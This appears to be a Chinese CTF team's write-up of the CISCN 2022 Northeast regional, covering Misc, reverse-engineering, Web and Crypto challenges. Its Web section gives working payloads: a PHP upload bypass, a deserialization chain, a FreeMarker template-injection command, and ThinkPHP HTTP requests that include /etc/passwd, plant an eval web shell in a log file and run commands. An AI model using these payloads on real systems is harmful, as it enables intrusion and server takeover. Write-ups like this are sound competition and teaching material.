#CISCN #CTF #WP 
# CISCN2022东北赛区WP-MapleLeaves
每年都是最后半小时被挤出前10，也许确实是能力不足吧...接下来还需要继续提升自己，再学再战！
## 团队成员
Do1phln b477ery sfc9982 0HB
## Misc

### Conversion

密文中字母跨度在 G-K 间，不禁让人想往 A-F 平移，平移后即为且全部为可打印 **ASCII** 文本。
拖入本地离线 **CyberChef** 中先使用Base32，再使用Base85  IP method 解密得到 flag

### 听说这是一个二维码

分析音频，无有效信息。加之题目体制侧重于文件方向，使用 **010 Editor** 打开音频文件，在尾部发现类似 Base64 的文本信息，经过两次解密后得到某个东西的密码。
初步考虑文件内含压缩包或者音频存在隐写信息。经多个工具尝试过后发现 **DeepVoice** 可以提取隐藏的文件，提取后是 **.pcap** 格式，观察后为内网虚拟机互喷 ICMP 包。 目标地址只有 **.0** **.255** 两个，结合题目，猜测可能代表了二维码的黑白像素，又发现记录条数正好可以被开方，爽爆了！提取出来，用 **Sublime Text 3** 删掉多余信息，转化为01矩阵。

使用脚本：

```python=
import xlwt

book = xlwt.Workbook()
style = xlwt.easyxf('pattern: pattern solid, fore_colour black;font: height 250')
table=book.add_sheet('flag_code',cell_overwrite_ok=True)

with open( 'flag.pcap.out', 'r' ) as f:
	qr=f.read()
qrlist=qr.split("\n")
m=0
for i in qrlist:
	n=0
	for j in i:
		table.col(n).width=256*3
		if j=='1': # 黑像素
			table.write(m,n,'',style=style)
		else:
			table.write(m,n,'') # 白像素
		n+=1
	m+=1
book.save('ctfcode.xls')
```

好恼啊，手机 Data Metrix 扫不出来！

`Win + Shift + C` 使用系统自带反转灰度
后扫描即可

### 涂色板

+- 0x20 <=> XOR 0x20

```python=
b = bytearray(open('flag.dat', 'rb').read())
for i in range(len(b)):
    b[i] ^= 0x20
open('pixel.png', 'wb').write(b)

```

**Stegseek** + Rockyou.txt 字典库爆破密码


数学Time：

![](https://image.0error.net/img/202220220619113400.png)

- 459*60=27540
- 先抓住12，再抓45，最后注意左上角就行
- 如果是n种颜色（n大于等于4）就是n(n-1)(n^2-2n+2)(n-2)^4
- 最少3种颜色，有30种，3种颜色时上式仍旧成立（


### Pixel

从象棋语句中提取数字解压文件，获取到密码后得到 `flag.dat`，使用二进制编辑器观察文件末尾，两次Base64解码得到密码。

观察十六进制标志，疑似为微信撤回图片文件。提取出照片得到林荫小道照片一张，送入 **PixelJihad** 
https://sekao.net/pixeljihad/
后使用之前获得的密码解密。


## RE

### easycpp

打开文件用IDA分析，进入main函数

```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void **v3; // rcx
  size_t v4; // r8
  size_t v5; // r10
  void **v6; // rax
  void **v7; // r8
  void **v8; // rax
  void **v9; // r8
  void **v10; // rax
  void **v11; // r8
  void **v12; // rdx
  int v13; // eax
  const char *v14; // rdx

  sub_140002410(argc, "Input:", envp);
  sub_140002B60(&qword_140037590);
  if ( Size != 38 )
    goto LABEL_22;
  v5 = 0i64;
  v3 = &Buf1;
  do
  {
    v6 = &Buf1;
    v7 = &Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v6 = (void **)Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v7 = (void **)Buf1;
    *((_BYTE *)v7 + v5) ^= *((_BYTE *)v6 + v5 + 1);
    v8 = &Buf1;
    v9 = &Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v8 = (void **)Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v9 = (void **)Buf1;
    *((_BYTE *)v9 + v5 + 1) ^= *((_BYTE *)v8 + v5 + 2);
    v10 = &Buf1;
    v11 = &Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v10 = (void **)Buf1;
    if ( (unsigned __int64)qword_140036C68 >= 0x10 )
      v11 = (void **)Buf1;
    *((_BYTE *)v11 + v5 + 2) ^= *((_BYTE *)v10 + v5 + 3);
    ++v5;
    v4 = Size;
  }
  while ( v5 < Size - 3 );
  v12 = &Buf2;
  if ( (unsigned __int64)qword_140036C48 >= 0x10 )
    v12 = (void **)Buf2;
  if ( (unsigned __int64)qword_140036C68 >= 0x10 )
    v3 = (void **)Buf1;
  if ( Size != qword_140036C40 || (v13 = memcmp(v3, v12, Size), v14 = "Right!", v13) )
LABEL_22:
    v14 = "Wrong!";
  sub_140002410(v3, v14, v4);
  return 0;
}
```
可见基本逻辑就是输入字符串后经过一系列异或操作然后进行比较即可判断最终结果对错。显然`qword_140036C68`为0xF恒大于0x10，因此可以看出基本逻辑就是反复移位异或，得出结果与原有数组比较，因此只需逆向进行异或操作即可，编写脚本

```python=
enc = [
       10,  11, 125,  47, 127, 103, 101,  48,  99,  96, 
   55,  63,  60,  63,  51,  58,  60,  59,  53,  60, 
   62, 108, 100,  49, 100, 108,  59, 104,  97,  98, 
  101,  54,  51,  96,  98,  54,  28, 125
]

i = len(enc) - 1
while i >= 3:
    enc[i-1] ^= enc[i]
    enc[i-2] ^= enc[i - 1]
    enc[i-3] ^= enc[i - 2]
    
    i = i - 1

for i in enc:
    print(chr(i), end='')
```
flag正确，本题得解

### crackme1

下载到apk文件后，用jadx打开分析发现逻辑没有套在CPP里面，遂直接进行分析
![](https://image.0error.net/img/202220220619113437.png)
可知程序逻辑是把输入分8段算md5
将题中给出的字符串分八段分别进行md5爆破，最后将结果拼接后即可得到flag

## Web
### Identity
burp 抓包，返回的 header 中有 identity: GuessWhatThis1sY0urIdentity  
将 identity=GuessWhatThis1sY0urIdentity 作为参数再次请求得到文件上传点 h1dden_p4ge.php  
文件上传，文件名改大写 PHP 绕过，文件内容绕过用 
```php
<script language="php">system('xxx')</script>
```


### ezser
这题一开始想利用绕过 __wakeup，然后版本是 8.x 绕不过，于是改用引用来绕过 __wakeup  
```php
<?php
class A{
    public $functions=[];
}
class B{
    private $a;
    private $b;
    public $c;
    function __construct()
    {
        $a = new A();
        $this->a = &$a->functions;
        $this->b = array(
            "_name" => array(
                new C(),
                "getFlag"
            )
        );
        $this->c=$a;
    }
}
class C{
    public function getFlag(){
        // echo file_get_contents("/etc/flag");
        echo 11111;
    }
}

$b = new B();
echo "data=".urlencode(serialize($b)).PHP_EOL;
// data=O%3A1%3A%22B%22%3A3%3A%7Bs%3A4%3A%22%00B%00a%22%3Ba%3A0%3A%7B%7Ds%3A4%3A%22%00B%00b%22%3Ba%3A1%3A%7Bs%3A5%3A%22_name%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A%22C%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22getFlag%22%3B%7D%7Ds%3A1%3A%22c%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A9%3A%22functions%22%3BR%3A2%3B%7D%7D
```


### ezssti

试了下 {{1 + 1}}，报错看出是 java，于是找个 java 的 payload，居然通了...  
payload: `xxx/render?name=%3C%23assign%20value%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bvalue(%22cat%20F1ag_is_h3re%22)%7D`

### eztp
首先，路由入口点 `/?s=home/index/textBox`
Application\Home\Controller\IndexController.class.php  
```php
<?php
namespace Home\Controller;

use Think\Controller;

class IndexController extends Controller
{
    ...

    public function textBox(){
        $query = urldecode(I("post.query")); # 获取 post["query"]
        parse_str($query,$array); # 作为 url参数解析并赋给 $array
        $this->assign("array",$array); # 模板渲染变量赋值
        $this->display(T("Home@default/list")); # 渲染模板
    }
}
```
Application\Home\View\default\list.html  
```htmlmixed=
<form action="/?s=home/index/textBox" method="post"> <!-- 从这里也能看出路由 -->
<label>query</label><input type="text" size="10" maxlength="30" name="query">
<input type="submit" name="" value="submit">
</form>
<textarea><?php echo W("Query/query",array("param"=>$array));?></textarea> <!-- 调用 W 函数调用 Query/query Widget -->
```
Application\Home\Widget\QueryWidget.class.php  
```php
<?php

namespace Home\Widget;

class QueryWidget
{
    public function query($text){

        if(isset($text['name'])&&isset($text['id'])){
            $info = B($text['name'],$text['tag'],$text['id']); # 条件满足则可以调用 B 函数 我们来看看这个函数的定义
            return $info;
        }else{
            var_dump($text);
        }

    }
}
```
ThinkPHP\Common\functions.php  
```php=823
<?
/**
 * 执行某个行为
 * @param string $name 行为名称
 * @param string $tag 标签名称（行为类无需传入）
 * @param Mixed $params 传入的参数
 * @return void
 */
function B($name, $tag = '', &$params = null)
{
    if ('' == $tag) {
        $name .= 'Behavior';
    }
    return \Think\Hook::exec($name, $tag, $params); # 那么这个函数又是干什么的？
}
```
ThinkPHP\Library\Think\Hook.class.php  
```php=
<?
class Hook{
    ...
        
    /**
     * 执行某个插件
     * @param string $name 插件名称
     * @param string $tag 方法名（标签名）
     * @param Mixed $params 传入的参数
     * @return void
     */
    public static function exec($name, $tag, &$params = null)
    {
        if ('Behavior' == substr($name, -8)) {
            // 行为扩展必须用run入口方法
            $tag = 'run';
        }
        $addon = new $name(); # 实例化一个类 name 作为类名
        return $addon->$tag($params); # 调用一个方法并传参，tag 为方法名，params 为参数
    }
    
    ...   
}
```
这里的 name tag params 都是可控的，于是我们就可以实例化任意类并调用任意方法，恰好有这样一个类  
ThinkPHP\Library\Think\Storage\Driver\File.class.php  
```php
<?php

class File extends Storage{
    ...
        
    /**
     * 加载文件
     * @access public
     * @param string $filename  文件名
     * @param array $vars  传入变量
     * @return void
     */
    public function load($_filename, $vars = null)
    {
        if (!is_null($vars)) {
            extract($vars, EXTR_OVERWRITE);
        }
        include $_filename; # 任意文件包含
    }
    
    ...
}
```
于是构造参数调用 Think\Storage\Driver\File->load 即可包含任意文件。  
```http
POST /?s=home/index/textBox HTTP/1.1
Host: 172.16.30.176:58002
Content-Length: 105
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.30.176:58002
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.30.176:58002/?s=home/index/textBox
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

query=name%253D%255CThink%255CStorage%255CDriver%255CFile%2526id%253D%252Fetc%252Fpasswd%2526tag%253Dload
```
成功包含 /etc/passwd，于是找一个可以包含的可控文本文件。通过观察可以发现这个框架是有日志文件的，而且会把 E 函数的报错信息写入日志文件，搜索一个可以触发 E 函数报错且信息可控的类方法  
ThinkPHP\Library\Org\Net\Http.class.php  
```php
<?
namespace Org\Net;

class Http
    /**
     * 下载文件
     * 可以指定下载显示的文件名，并自动发送相应的Header信息
     * 如果指定了content参数，则下载该参数的内容
     * @static
     * @access public
     * @param string $filename 下载文件名
     * @param string $showname 下载显示的文件名
     * @param string $content  下载的内容
     * @param integer $expire  下载内容浏览器缓存时间
     * @return void
     */
    public static function download($filename, $showname = '', $content = '', $expire = 180)
    {
        if (is_file($filename)) {
            $length = filesize($filename);
        } elseif (is_file(UPLOAD_PATH . $filename)) {
            $filename = UPLOAD_PATH . $filename;
            $length   = filesize($filename);
        } elseif ('' != $content) {
            $length = strlen($content);
        } else {
            E($filename . L('下载文件不存在！')); # 这里把文件名赋成要写入日志的 php 代码
        }
        if (empty($showname)) {
            $showname = $filename;
        }
    
    ...
```
于是我们就可以 getshell 了，先触发报错将 shell 写入日志，再文件包含日志文件  
写 shell  
```http
POST /?s=home/index/textBox HTTP/1.1
Host: 172.16.30.176:58002
Content-Length: 143
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.30.176:58002
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.30.176:58002/?s=home/index/textBox
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

query=name%253DOrg%255CNet%255CHttp%2526id%253D%253C%253Fphp%2520%2540eval(%2524_POST%255Bpass%255D)%253B%2520%253F%253E%2526tag%253Ddownload

```
读 flag，这里的文件路径是先 ls 来的  
```http
POST /?s=home/index/textBox HTTP/1.1
Host: 172.16.30.176:58002
Content-Length: 188
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.16.30.176:58002
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://172.16.30.176:58002/?s=home/index/textBox
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

query=name%253D%255CThink%255CStorage%255CDriver%255CFile%2526id%253D.%252FApplication%252FRuntime%252FLogs%252FHome%252F22_06_18.log%2526tag%253Dload&pass=system('cat /Secret_is_h3re');

```



## Crypto
### gcrd2（100）

#### 题目

```
import numpy as np
from flag import T
import random

np.set_printoptions(threshold=np.inf)
def get():
    while True:
        x = []
        for i in range(32):
            add = [random.randint(0, 10)] * i + [random.randint(0, 10)] * (32 - i)
            x.append(add)
        if np.linalg.matrix_rank(x) == 32:
            return x


a = np.array(get())
b = np.array(get())

# dot 矩阵乘法
aT = np.dot(a, T)
bT = np.dot(b, T)

with open('out', 'w') as f:
    for i in range(32):
        f.write(str(str(aT[i, :])[1:-1].replace('\n', '')) + '\n')   # 写入aT
    for i in range(32):
        f.write(str(str(bT[i, :])[1:-1].replace('\n', '')) + '\n')  # 写入 bT
f.close()
res = np.dot(bT, np.dot(T, aT))
flag = 0
for i in str(res[:, 0])[1:-1].replace('\n', '').split(' '):
    if not i == '':
        flag = flag + int(i)
print(flag)
```

#### 题解

```
aT = np.dot(a, T)
bT = np.dot(b, T)
```

可知：T为矩阵aT、bT的最大右公因子

![](https://image.0error.net/img/202220220619113505.png)

由gcrd得：

将aT、bT堆叠成$\begin{bmatrix} aT \\ bT\end{bmatrix}$,初等行变化 利用MATLAB化为最简行阶梯形矩阵

```matlab
aTbT = [8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8;
8, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5;
4, 4, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
4, 4, 4, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9;
4, 4, 4, 4, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5;
10, 10, 10, 10, 10, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
2, 2, 2, 2, 2, 2, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9;
8, 8, 8, 8, 8, 8, 8, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5;
3, 3, 3, 3, 3, 3, 3, 3, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9;
9, 9, 9, 9, 9, 9, 9, 9, 9, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3;
4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0;
8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0;
9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10;
7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9;
1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2;
6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 10, 10, 10, 10, 10, 10, 10, 10, 10;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 2, 2, 2, 2, 2, 2, 2, 2;
1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 9, 9, 9, 9, 9, 9, 9;
2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 8, 8, 8, 8;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 9, 9, 9, 9;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 0, 0, 0;
9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 3, 3;
6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 10;
1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
10, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2;
9, 9, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3;
0, 0, 0, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8;
0, 0, 0, 0, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
1, 1, 1, 1, 1, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4;
9, 9, 9, 9, 9, 9, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
5, 5, 5, 5, 5, 5, 5, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10;
7, 7, 7, 7, 7, 7, 7, 7, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3;
5, 5, 5, 5, 5, 5, 5, 5, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1;
6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7;
1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0;
8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6;
3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 3, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10;
9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5;
9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9;
9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 9, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10;
10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2;
2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 10, 10, 10, 10, 10, 10, 10, 10, 10;
1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 9, 9, 9, 9, 9, 9, 9, 9;
0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1;
10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 2, 2, 2, 2, 2, 2;
8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 9, 9, 9, 9, 9;
10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 6, 6, 6, 6;
5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 4, 4, 4;
10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 1, 1;
4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 4, 0;];

t = rref(aTbT)
```

舍去下半部分0矩阵，得到32*32的单位阵T

代回题目，得解

```python
import hashlib
import numpy as np

with open('/Users/wenhui/Downloads/1655300570gcrd/out.txt') as f:
    aTbT = []
    num = 1
    for i in f.readlines():
        tmp = []

        for each in i.replace('\n', '').split(' '):
            if each != '':
                tmp.append(int(each))
        aTbT.append(tmp)
        print(str(tmp)[1:-1]+';')
        num += 1
aT = aTbT[:32]
bT = np.array(aTbT[32:])

T = []
for i in range(32):
    tmp = [0 for i in range(32)]
    tmp[i] = 1
    T.append(tmp)

res = np.dot(bT, np.dot(T, aT))

flag = 0
for i in str(res[:, 0])[1:-1].replace('\n', '').split(' '):
    if not i == '':
        flag = flag + int(i)

# print(flag)
f = hashlib.md5()
f.update(str(flag).encode())
print('flag{'+str(f.hexdigest())+'}')
```

### math1（200）

#### 题目

```
import gmpy2
from Crypto.Util.number import *
from flag import flag
assert flag.startswith(b"flag{")
assert flag.endswith(b"}")
message=bytes_to_long(flag)
def keygen(nbit, dbit):
    if 2*dbit < nbit:
        while True:
            a1 = getRandomNBitInteger(dbit)
            b1 = getRandomNBitInteger(nbit//2-dbit)

            n1 = a1*b1+1

            if isPrime(n1):
                break
        while True:
            a2 = getRandomNBitInteger(dbit)
            b2 = getRandomNBitInteger(nbit//2-dbit)

            n2=a2*b2+1

            n3=a1*b2+1
            if isPrime(n2) and isPrime(n3):
                break
        while True:
            a3=getRandomNBitInteger(dbit)
            if gmpy2.gcd(a3,a1*b1*a2*b2)==1:
                v1=(n1-1)*(n2-1) # phi1
                k=(a3*inverse(a3,v1)-1)//v1  # k * phi1=k * v1 = ed-1
                v2=k*b1+1
                if isPrime(v2):
                    return a3,n1*n2,n3*v2
def encrypt(msg, pubkey):
    return pow(msg, pubkey[0], pubkey[1])

nbit = 1024
dbit = 256
e, n1, n2=keygen(nbit, dbit)
print('e =', e)
print('n1 =', n1)
print('n2 =', n2)
c1 = encrypt(message, [e, n1])
c2 = encrypt(message, [e, n2])
print('enc1 =', c1)
print('enc2 =', c2)
# e = 86905291018330218127760596324522274547253465551209634052618098249596388694529
# n1 = 112187114035595515717020336420063560192608507634951355884730277020103272516595827630685773552014888608894587055283796519554267693654102295681730016199369580577243573496236556117934113361938190726830349853086562389955289707685145472794173966128519654167325961312446648312096211985486925702789773780669802574893
# n2 = 95727255683184071257205119413595957528984743590073248708202176413951084648626277198841459757379712896901385049813671642628441940941434989886894512089336243796745883128585743868974053010151180059532129088434348142499209024860189145032192068409977856355513219728891104598071910465809354419035148873624856313067
# enc1 = 71281698683006229705169274763783817580572445422844810406739630520060179171191882439102256990860101502686218994669784245358102850927955191225903171777969259480990566718683951421349181856119965365618782630111357309280954558872160237158905739584091706635219142133906953305905313538806862536551652537126291478865
# enc2 = 7333744583943012697651917897083326988621572932105018877567461023651527927346658805965099102481100945100738540533077677296823678241143375320240933128613487693799458418017975152399878829426141218077564669468040331339428477336144493624090728897185260894290517440392720900787100373142671471448913212103518035775
```

#### 题解

$n_1 = a_1b_1+1,n_2=a_2b_2+1, n_3 = a_1b_2+1,v_2=kb_1+1$,且都为素数

